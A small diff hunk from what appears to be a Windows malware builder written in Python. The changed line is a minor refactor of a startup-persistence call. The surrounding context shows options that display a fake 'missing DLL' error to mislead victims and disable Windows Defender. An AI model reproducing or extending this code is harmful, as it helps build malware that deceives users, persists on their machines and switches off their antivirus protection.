@@ -50,7 +50,7 @@ if cc.get_fake_error() == True:
     ctypes.windll.user32.MessageBoxW(0, "The program can't start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
 
 if cc.get_start_up() == True:
-    StartUp()
+    startup.StartUp()
     
 if cc.get_disable_windows_defender() == True:
     disabledefender()
